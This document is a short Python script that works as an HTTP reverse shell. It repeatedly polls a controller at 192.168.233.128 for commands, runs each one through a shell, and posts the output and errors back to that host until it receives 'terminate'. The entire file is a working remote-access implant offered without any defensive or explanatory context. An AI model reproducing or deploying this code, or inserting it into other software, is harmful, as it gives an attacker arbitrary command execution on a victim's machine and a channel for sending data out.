import requests
import subprocess
import time


while True:
    req = requests.get('http://192.168.233.128')
    command = req.text

    if 'terminate' in command:
        break

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.233.128', data = CMD.stdout.read())
        post_response = requests.post(url='http://192.168.233.128', data = CMD.stderr.read())

    time.sleep(3)
